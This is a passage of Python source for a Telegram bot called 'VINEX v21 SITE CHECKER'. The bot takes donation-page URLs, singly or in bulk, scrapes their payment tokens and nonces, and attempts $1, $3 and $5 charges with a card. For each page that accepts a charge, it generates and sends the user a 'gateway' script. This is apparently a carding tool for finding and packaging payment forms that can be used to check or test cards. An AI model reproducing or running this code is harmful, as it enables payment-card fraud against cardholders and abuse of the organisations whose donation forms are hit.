            f'🎨 <i>VINEX v21 — Built with love 💚</i>'
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back to Menu', 'primary', callback_data='back_start'))
        safe_send_message(message.chat.id, text, reply_markup=kb)
    except Exception:
        pass


@bot.message_handler(commands=['ping'])
def cmd_ping(message):
    try:
        t0 = time.time()
        sent = safe_send_message(message.chat.id, '🏓 <b>Pinging...</b>')
        dt = (time.time() - t0) * 1000
        if sent:
            safe_edit_message(
                message.chat.id, sent.message_id,
                f'🏓 <b>PONG!</b>\n'
                f'━━━━━━━━━━━━━━━\n'
                f'⚡ <b>Latency:</b> <code>{dt:.0f} ms</code>\n'
                f'🤖 <b>Bot:</b> <code>VINEX v21</code>\n'
                f'💾 <b>Users:</b> <code>{len(open(USERS_FILE).read().splitlines())}</code>\n'
                f'{playful("fun")} <i>Alive and kicking!</i>'
            )
    except Exception:
        pass


@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    try:
        s = load_stats()
        users_n = len(open(USERS_FILE).read().splitlines())
        rate = (s.get('live', 0) / s.get('checks', 1) * 100
                if s.get('checks', 0) else 0)
        # Visual bar
        filled = int(rate / 5)
        bar = '█' * filled + '░' * (20 - filled)
        text = (
            f'{vinex_header("Global Statistics")}\n\n'
            f'👥 <b>Users:</b> <code>{users_n}</code>\n'
            f'🔍 <b>Total checks:</b> <code>{s.get("checks", 0)}</code>\n'
            f'✅ <b>Live:</b> <code>{s.get("live", 0)}</code>\n'
            f'❌ <b>Dead:</b> <code>{s.get("dead", 0)}</code>\n'
            f'━━━━━━━━━━━━━━━\n'
            f'📈 <b>Live rate:</b>\n'
            f'<code>{bar}</code> <b>{rate:.1f}%</b>\n'
            f'━━━━━━━━━━━━━━━\n'
            f'{playful("success")} <i>Keep the gems coming!</i>'
        )
        safe_send_message(message.chat.id, text)
    except Exception:
        pass


@bot.message_handler(
    func=lambda m: m.text and m.text.lower().startswith('/paypal'),
)
def cmd_paypal(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, '🚫 Blocked.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_paypal[uid] < PAYPAL_COOLDOWN:
            return
        user_last_paypal[uid] = now

        chat_id = message.chat.id
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_send_message(
                chat_id,
                f'🎯 <b>Usage:</b>\n<code>/paypal URL</code>',
            )
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(chat_id, '❌ <b>Invalid link format.</b>')
            return

        lkey = f'{uid}:{normalize_url_key(link)}'
        if lkey in link_cooldowns:
            elapsed = now - link_cooldowns[lkey]
            if elapsed < LINK_COOLDOWN:
                rem = int(LINK_COOLDOWN - elapsed)
                safe_send_message(
                    chat_id,
                    f'⏳ <b>Cooling down...</b> {rem}s left for this link.',
                )
                return
        link_cooldowns[lkey] = now

        ko = safe_send_message(
            chat_id,
            f'{playful("working")} <b>VINEX SCAN INITIATED</b>\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
            f'🔍 <i>Warming up session...</i>\n'
            f'💉 <i>Hunting tokens across JS/HTML/AJAX...</i>\n'
            f'🎯 <i>Target amounts:</i> <b>$1 → $3 → $5</b>\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━',
        )
        if not ko:
            return

        bump_stat('checks')
        tester = VinexTester(link)
        tester.Key()
        result = tester.Charge(TEST_CARD, thorough=True)
        live = is_live_response(result) and not is_dead_response(result)

        if not live:
            bump_stat('dead')
            safe_edit_message(
                chat_id, ko.message_id,
                f'{playful("dead")} <b>NO LUCK THIS TIME</b>\n'
                f'━━━━━━━━━━━━━━━━━━━━━━━\n'
                f'🔗 <code>{link[:100]}</code>\n\n'
                f'📝 <b>Response:</b>\n'
                f'<code>{str(result)[:250]}</code>\n'
                f'━━━━━━━━━━━━━━━━━━━━━━━\n'
                f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
                f'🌐 <b>GW:</b> <code>{tester.gateway_type}</code>\n'
                f'🎯 <b>Candidates:</b> <code>{len(tester.token_candidates)}</code>',
            )
            return

        bump_stat('live')
        try:
            code = generate_gateway_code(result, link, tester)
            if not code or len(code) < 500:
                raise Exception(f'Too small: {len(code)}b')
        except Exception as e:
            safe_edit_message(
                chat_id, ko.message_id,
                f'❌ <b>Gateway error:</b>\n<code>{str(e)[:200]}</code>',
            )
            return

        fname = f'vinex_gateway_{int(time.time())}_{uid}.py'
        try:
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(code)
            log.info(f'VINEX gateway: {fname} ({len(code)}b)')
        except Exception as e:
            safe_edit_message(
                chat_id, ko.message_id,
                f'❌ <b>File error:</b>\n<code>{str(e)[:200]}</code>',
            )
            return

        display = normalize_result(result)[:150]
        is_charge = 'CHARGE' in str(result).upper()
        tag = '💰 <b>CHARGE!</b>' if is_charge else '💳 <b>Gateway LIVE</b>'
        caption = (
            f'{playful("live")} <b>VINEX — {tag}</b>\n'
            f'╔══════════════════════════╗\n'
            f'║  🔗 TARGET ACHIEVED      ║\n'
            f'╚══════════════════════════╝\n'
            f'🔗 <code>{link[:100]}</code>\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
            f'💬 <b>Response:</b>\n'
            f'<code>{display}</code>\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
            f'💰 <b>Amount:</b> <code>${tester.donation}</code>\n'
            f'💱 <b>Currency:</b> <code>{tester.currency}</code>\n'
            f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
            f'🌐 <b>GW:</b> <code>{tester.gateway_type}</code>\n'
            f'━━━━━━━━━━━━━━━━━━━━━━━\n'
            f'⚡ <i>Amounts: 1$ → 3$ → 5$</i>\n'
            f'🌟 <i>VINEX v21</i>'
        )
        sent = safe_send_document(chat_id, fname, caption=caption)
        if sent:
            safe_edit_message(chat_id, ko.message_id,
                              f'{playful("success")} <b>Delivered!</b>')
            log.info(f'VINEX delivered: {fname}')
        else:
            safe_edit_message(
                chat_id, ko.message_id,
                f'⚠️ <b>File delivery failed</b>\n{display[:150]}',
            )
        if sent:
            try:
                os.remove(fname)
            except Exception:
                pass
    except Exception:
        log.exception('cmd_paypal')


@bot.message_handler(commands=['mass'])
def cmd_mass(message):
    try:
        save_user(message.from_user.id)
        if is_blocked(message.from_user.id):
            safe_send_message(message.chat.id, '🚫 Blocked.')
            return
        uid = message.from_user.id
        now = time.time()
        if now - user_last_mass[uid] < MASS_COOLDOWN:
            return
        user_last_mass[uid] = now
        if mass_active.get(uid, False):
            safe_send_message(
                message.chat.id,
                '⚠️ <b>Job already running!</b>\nUse /stop first.',
            )
            return
        msg = safe_send_message(
            message.chat.id,
            f'{vinex_header("Bulk Mode")}\n\n'
            f'📁 <b>Send your .txt file</b>\n'
            f'  ▸ One URL per line\n'
            f'  ▸ Max 10 MB\n'
            f'  ▸ Smart dedup automatic\n\n'
            f'🎯 <b>Amounts:</b> 1$ → 3$ → 5$\n'
            f'♻️ <code>/resume</code> if interrupted',
        )
        if msg:
            bot.register_next_step_handler(msg, handle_mass_file)
    except Exception:
        log.exception('cmd_mass')


@bot.message_handler(commands=['resume'])
def cmd_resume(message):
    try:
        uid = message.from_user.id
        chat_id = message.chat.id
        progress = load_progress(uid)
        if not progress:
            safe_send_message(chat_id, '❌ <b>No saved progress.</b>')
            return
        total = progress.get('total', 0)
        processed = progress.get('processed', 0)
        if processed >= total:
            safe_send_message(chat_id, f'✅ <b>Already complete</b> ({processed}/{total})')
            clear_progress(uid)
            return
        links = progress.get('links', [])
        safe_send_message(
            chat_id,
            f'♻️ <b>Resuming...</b>\n📌 From {processed}/{total}',
        )
        threading.Thread(
            target=run_mass_job,
            args=(chat_id, uid, links, processed, progress),
            daemon=True,
        ).start()
    except Exception:
        log.exception('cmd_resume')


@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    try:
        uid = message.from_user.id
        if mass_active.get(uid, False):
            mass_pause[uid] = True
            safe_send_message(message.chat.id, '🛑 <b>Stopping...</b>')
        else:
            safe_send_message(message.chat.id, '❌ <b>No active job.</b>')
    except Exception:
        pass


def handle_mass_file(message):
    try:
        if not message.document:
            safe_send_message(message.chat.id, '❌ <b>Send a .txt file.</b>')
            return
        size = message.document.file_size or 0
        if size > MAX_FILE_SIZE:
            safe_send_message(
                message.chat.id,
                f'❌ <b>File too large</b>\n{size // 1024} KB / max 10 MB',
            )
            return
        uid = message.from_user.id
        chat_id = message.chat.id

        # Resilient fetch
        try:
            file_info = retry_call(bot.get_file, message.document.file_id, retries=4)
        except Exception as e:
            log.error(f'get_file failed: {e}')
            safe_send_message(
                chat_id,
                f'⚠️ <b>Network hiccup fetching file</b>\n'
                f'<i>Please try again in a moment.</i>\n'
                f'<code>{str(e)[:150]}</code>',
            )
            return

        try:
            downloaded = retry_call(bot.download_file, file_info.file_path, retries=4)
        except Exception as e:
            log.error(f'download_file failed: {e}')
            safe_send_message(
                chat_id,
                f'⚠️ <b>Download timeout</b>\n'
                f'<i>Retry in a moment.</i>\n'
                f'<code>{str(e)[:150]}</code>',
            )
            return

        if not downloaded:
            safe_send_message(chat_id, '❌ <b>Empty file.</b>')
            return

        raw = downloaded.decode('utf-8', errors='ignore').splitlines()
        links = []
        seen = set()
        dupes = 0
        for line in raw:
            s = safe_url(line.strip())
            if not s:
                continue
            key = normalize_url_key(s)
            if key in seen:
                dupes += 1
                continue
            seen.add(key)
            links.append(s)

        if not links:
            safe_send_message(chat_id, '❌ <b>No valid URLs.</b>')
            return

        total = len(links)
        progress = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'links': links, 'started_at': time.time(),
        }
        save_progress(uid, progress)
        dupe_msg = f'\n🗑️ <b>Duplicates removed:</b> <code>{dupes}</code>' if dupes else ''
        safe_send_message(
            chat_id,
            f'{vinex_header("Ready to Roll!")}\n\n'
            f'✅ <b>Loaded:</b> <code>{total}</code> unique links{dupe_msg}\n'
            f'🔍 <b>Mode:</b> <i>THOROUGH</i>\n'
            f'🎯 <b>Charges:</b> $1 → $3 → $5\n'
            f'🚀 <b>Launching...</b>\n'
            f'━━━━━━━━━━━━━━━━━━━\n'
            f'{playful("fun")} <i>Let\'s go!</i>',
        )
        threading.Thread(
            target=run_mass_job,
            args=(chat_id, uid, links, 0, progress),
            daemon=True,
        ).start()
    except Exception:
        log.exception('handle_mass_file')
        safe_send_message(message.chat.id, '❌ <b>Error processing file.</b>')

# ═════════════════════════════════════════════════════════════════
#  📊 MASS JOB
# ═════════════════════════════════════════════════════════════════
def run_mass_job(chat_id, uid, links, start_idx, progress):
    total = len(links)
    processed = start_idx
    live = progress.get('live', 0)
    dead = progress.get('dead', 0)
    started_at = progress.get('started_at', time.time())
    mass_active[uid] = True
    mass_pause[uid] = False

    results_file = RESULTS_TMPL.format(uid, int(started_at))
    live_dir = LIVE_DIR_TMPL.format(uid, int(started_at))
    try:
        os.makedirs(live_dir, exist_ok=True)
    except Exception:
        pass

    status_msg = safe_send_message(
        chat_id,
        f'{vinex_header("Mass Scan Running")}\n'
        f'📌 Total: <code>{total}</code>\n'
        f'🔍 Mode: <b>THOROUGH</b>\n'
        f'⏳ <i>Preparing...</i>',
    )

    state = {'last_link': '', 'last_resp': '', 'last_live': False,
             'status': 'starting', 'live_idx': 0}

    def status_loop():
        while mass_active.get(uid, False):
            try:
                if not status_msg:
                    time.sleep(STATUS_UPDATE_EVERY)
                    continue
                pct = int((processed / total) * 100) if total else 0
                elapsed = time.time() - started_at
                spd = processed / elapsed if elapsed else 0
                eta = (total - processed) / spd if spd > 0 else 0
                filled = int((pct / 100) * 20)
                bar = '█' * filled + '░' * (20 - filled)
                if state['last_link']:
                    icon = '✅' if state['last_live'] else '❌'
                    last = (f"{icon} <b>Last:</b>\n"
                            f"<code>{state['last_link'][:60]}</code>\n"
                            f"💬 {state['last_resp'][:60]}")
                else:
                    last = '⏳ <i>Waiting for first result...</i>'
                st = ('🔄 <i>Deep-checking...</i>' if state['status'] == 'checking'
                      else '⏸️ <i>Moving...</i>')
                text = (
                    f'📊 <b>VINEX MASS SCAN</b>\n'
                    f'━━━━━━━━━━━━━━━━━━━\n'
                    f'📌 <b>Total:</b> <code>{total}</code>\n'
                    f'✅ <b>Live:</b> <code>{live}</code>\n'
                    f'❌ <b>Dead:</b> <code>{dead}</code>\n'
                    f'⏳ <b>{pct}%</b> {bar}\n'
                    f'━━━━━━━━━━━━━━━━━━━\n'
                    f'{last}\n'
                    f'━━━━━━━━━━━━━━━━━━━\n'
                    f'{st}\n'
                    f'⚡ <b>Speed:</b> <code>{spd:.2f}/s</code>\n'
                    f'🕐 <b>ETA:</b> <code>{int(eta // 60)}m {int(eta % 60)}s</code>'
                )
                safe_edit_message(chat_id, status_msg.message_id, text)
            except Exception:
                pass
            time.sleep(STATUS_UPDATE_EVERY)

    threading.Thread(target=status_loop, daemon=True).start()

    try:
        for idx in range(start_idx, total):
            if mass_pause.get(uid, False):
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
                safe_send_message(
                    chat_id,
                    f'🛑 <b>Stopped</b>\n📌 At {processed}/{total}\n♻️ /resume',
                )
                return
            link = links[idx]
            state['status'] = 'checking'
            try:
                result = check_single_link(link, thorough=True)
            except Exception:
                result = {'link': str(link)[:100], 'live': False,
                          'respons': 'FATAL', 'tester': None}
            processed += 1
            resp = normalize_result(result.get('respons', 'Unknown'))[:100]
            is_live = result.get('live', False)
            state['last_link'] = link
            state['last_resp'] = resp
            state['last_live'] = is_live
            try:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(f'{link} => {result.get("respons", "unknown")}\n')
            except Exception:
                pass
            bump_stat('checks')
            if is_live:
                live += 1
                state['live_idx'] += 1
                bump_stat('live')
                try:
                    tester = result.get('tester')
                    code = generate_gateway_code(result['respons'], result['link'], tester)
                    gpath = os.path.join(live_dir, f'gateway_{state["live_idx"]}.py')
                    with open(gpath, 'w', encoding='utf-8') as f:
                        f.write(code)
                    cur = tester.currency if tester else 'USD'
                    auth = tester.auth_method if tester else 'none'
                    caption = (
                        f'{playful("live")} <b>LIVE #{state["live_idx"]}</b>\n'
                        f'━━━━━━━━━━━━━━━━\n'
                        f'🔗 <code>{result["link"][:80]}</code>\n'
                        f'💬 {resp[:80]}\n'
                        f'💰 <b>${result.get("amount", "1.00")}</b> | {cur} | {auth}\n'
                        f'━━━━━━━━━━━━━━━━\n'
                        f'🌟 <i>VINEX v21</i>'
                    )
                    sent = safe_send_document(chat_id, gpath, caption=caption)
                    if sent:
                        try:
                            os.remove(gpath)
                        except Exception:
                            pass
                    else:
                        log.error(f'Mass delivery failed: {gpath}')
                except Exception:
                    log.exception('live delivery')
            else:
                dead += 1
                bump_stat('dead')
            if processed % PROGRESS_SAVE_EVERY == 0:
                progress['processed'] = processed
                progress['live'] = live
                progress['dead'] = dead
                save_progress(uid, progress)
            state['status'] = 'moving'

        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        rate = int((live / total) * 100) if total else 0
        final = (
            f'{playful("success")} <b>VINEX MASS COMPLETE!</b>\n'
            f'╔══════════════════════╗\n'
            f'║  🎉 SCAN FINISHED  ║\n'
            f'╚══════════════════════╝\n'
            f'📌 <b>Total:</b> <code>{total}</code>\n'
            f'✅ <b>Live:</b> <code>{live}</code>\n'
            f'❌ <b>Dead:</b> <code>{dead}</code>\n'
            f'💯 <b>Rate:</b> <code>{rate}%</code>\n'
            f'📁 <b>Results:</b> <code>{results_file}</code>'
        )
        if status_msg:
            safe_edit_message(chat_id, status_msg.message_id, final)
        else:
            safe_send_message(chat_id, final)
        clear_progress(uid)
    except Exception:
        log.exception('run_mass_job')
        progress['processed'] = processed
        progress['live'] = live
        progress['dead'] = dead
        save_progress(uid, progress)
        safe_send_message(
            chat_id,
            f'⚠️ <b>Crashed at {processed}/{total}</b>\n♻️ /resume',
        )
    finally:
        mass_active[uid] = False

# ═════════════════════════════════════════════════════════════════
#  🔬 DIAGNOSTICS
# ═════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['diag'])
def cmd_diag(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            safe_send_message(message.chat.id, '❌ <b>Admin only.</b>')
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send_message(message.chat.id, 'Usage: <code>/diag URL</code>')
            return
        link = safe_url(parts[1].strip())
        if not link:
            safe_send_message(message.chat.id, '❌ Invalid link.')
            return
        msg = safe_send_message(message.chat.id, '🔬 <b>Diagnosing...</b>')
        if not msg:
            return
        tester = VinexTester(link)
        tester.Key()
        report = (
            f'🔬 <b>VINEX DIAGNOSTICS</b>\n'
            f'━━━━━━━━━━━━━━━━━━\n'
            f'🔗 <code>{link[:80]}</code>\n'
            f'🌐 <b>GW:</b> <code>{tester.gateway_type}</code>\n'
            f'📄 <b>HTML:</b> <code>{len(tester.page_html)}b</code>\n'
            f'📦 <b>Content:</b> <code>{len(tester.all_content)}b</code>\n'
            f'🆔 <b>Form:</b> <code>{tester.id_form2 or "NONE"}</code>\n'
            f'📝 <b>Nonce:</b> <code>{tester.nonce or "NONE"}</code>\n'
            f'🎟️ <b>Candidates:</b> <code>{len(tester.token_candidates)}</code>\n'
            f'✅ <b>Verified:</b> <code>{tester.token_verified}</code>\n'
            f'💱 <b>Currency:</b> <code>{tester.currency}</code>\n'
            f'💰 <b>Min:</b> <code>{tester.minimum}</code>\n'
            f'📋 <b>Fields:</b> <code>{len(tester.form_fields)}</code>\n'
            f'🔐 <b>Auth:</b> <code>{tester.auth_method}</code>\n'
            f'📊 <b>Amounts:</b> <code>{tester._build_amounts()}</code>'
        )
        safe_edit_message(message.chat.id, msg.message_id, report)
    except Exception:
        log.exception('cmd_diag')

# ═════════════════════════════════════════════════════════════════
#  🎯 CALLBACKS
# ═════════════════════════════════════════════════════════════════
@bot.callback_query_handler(func=lambda c: c.data == 'stats')
def cb_stats(call):
    try:
        bot.answer_callback_query(call.id, '📊 Loading stats...')
        cmd_stats(call.message)
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data == 'help')
def cb_help(call):
    try:
        bot.answer_callback_query(call.id)
        cmd_help(call.message)
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data == 'stop')
def cb_stop(call):
    try:
        bot.answer_callback_query(call.id, '🛑 Stopping...')
        cmd_stop(call.message)
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data == 'howto_paypal')
def cb_howto(call):
    try:
        bot.answer_callback_query(call.id, '💡 Just type it!')
        safe_send_message(
            call.message.chat.id,
            f'🎯 <b>Ready to scan!</b>\n\n'
            f'Just type:\n'
            f'<code>/paypal https://example.com/donate</code>\n\n'
            f'⚡ <i>I\'ll handle the rest.</i>',
        )
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data == 'back_start')
def cb_back_start(call):
    try:
        bot.answer_callback_query(call.id)
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
        except Exception:
            pass
        cmd_start(call.message)
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data == 'yrr')
def cb_feedback(call):
    try:
        bot.answer_callback_query(call.id)
        uid = call.from_user.id
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Back', 'primary', callback_data='back_start'))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f'✍️ <b>Send your message:</b>\n<i>The owner will receive it.</i>',
                parse_mode='HTML', reply_markup=kb)
        except Exception:
            pass
        waiting_users[uid] = True
    except Exception:
        pass


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def handle_user_msg(message):
    try:
        uid = message.from_user.id
        text = message.text or '(non-text)'
        kb = types.InlineKeyboardMarkup()
        kb.add(vinex_btn('Reply', 'success', callback_data=f'reply_{uid}'))
        safe_send_message(
            OWNER_ID,
            f'📩 <b>New Message</b>\n'
            f'👤 {message.from_user.first_name}\n'
            f'🆔 <code>{uid}</code>\n'
            f'💬 {text}',
            reply_markup=kb,
        )
        safe_send_message(uid, '✅ <b>Sent!</b>')
        waiting_users.pop(uid, None)
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data.startswith('reply_'))
def cb_reply(call):
    try:
        target = int(call.data.split('_', 1)[1])
        reply_mode[call.from_user.id] = target
        safe_send_message(call.from_user.id, '✍️ <b>Reply:</b>')
    except Exception:
        pass


@bot.message_handler(
    func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode,
)
def handle_admin_reply(message):
    try:
        target = reply_mode[message.from_user.id]
        safe_send_message(target, f'💬 <b>Admin:</b>\n\n{message.text or ""}')
        safe_send_message(OWNER_ID, '✅ Sent.')
        reply_mode.pop(message.from_user.id, None)
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════
#  👑 ADMIN
# ═════════════════════════════════════════════════════════════════
@bot.message_handler(commands=['block2'])
def admin_block(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit():
            return
        uid = parts[1].strip()
        if uid in open(BLOCK_FILE).read().splitlines():
            safe_send_message(message.chat.id, '⚠️ Already blocked.')
            return
        with open(BLOCK_FILE, 'a') as f:
            f.write(f'{uid}\n')
        safe_send_message(message.chat.id, f'✅ Blocked <code>{uid}</code>')
    except Exception:
        pass


@bot.message_handler(commands=['unblock2'])
def admin_unblock(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            return
        parts = message.text.split()
        if len(parts) < 2 or not parts[1].isdigit():
            return
        uid = parts[1].strip()
        lines = open(BLOCK_FILE).readlines()
        with open(BLOCK_FILE, 'w') as f:
            for l in lines:
                if l.strip() != uid:
                    f.write(l)
        safe_send_message(message.chat.id, f'✅ Unblocked <code>{uid}</code>')
    except Exception:
        pass


@bot.message_handler(commands=['broadcast'])
def admin_broadcast(message):
    try:
        if str(message.from_user.id) not in ADMINS:
            return
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            return
        msg_text = parts[1]
        users = [l.strip() for l in open(USERS_FILE).read().splitlines() if l.strip()]
        sent = 0
        failed = 0
        for u in users:
            try:
                if safe_send_message(int(u), msg_text):
                    sent += 1
                else:
                    failed += 1
                time.sleep(0.05)
            except Exception:
                failed += 1
        safe_send_message(
            message.chat.id,
            f'📢 <b>Broadcast done.</b>\n✅ {sent} | ❌ {failed}',
        )
    except Exception:
        pass

# ═════════════════════════════════════════════════════════════════
#  🚀 MAIN — Resilient polling
# ═════════════════════════════════════════════════════════════════
if __name__ == '__main__':
    log.info('VINEX v21 starting...')
    print(r'''
    __  ___  _  __ ______ _  __
   / / / _ \/ |/ // __/ / |/ /
  / /_/ // /    // _/ /    /
 /___/_//_/_/|_/___/_/_/|_/
    SITE CHECKER v21
    ''')
    try:
        cleanup_old_files()
    except Exception:
        pass

    while True:
        try:
            log.info('Polling loop starting...')
            bot.infinity_polling(
                timeout=60,
                long_polling_timeout=60,
                skip_pending=True,
                logger_level=logging.WARNING,
            )
        except KeyboardInterrupt:
            log.info('Manual shutdown.')
            break
        except Exception as e:
            err = str(e).lower()
            log.error(f'Polling crash: {str(e)[:200]}')
            if '429' in err or 'too many' in err:
                try:
                    wait = int(err.split('retry after ')[1].split()[0])
                except Exception:
                    wait = 30
                log.info(f'Rate limited. Sleeping {wait}s...')
                time.sleep(wait)
            elif '502' in err or 'bad gateway' in err:
                log.info('Bad gateway. Sleeping 20s...')
                time.sleep(20)
            else:
                log.info('Retrying in 15s...')
                time.sleep(15)
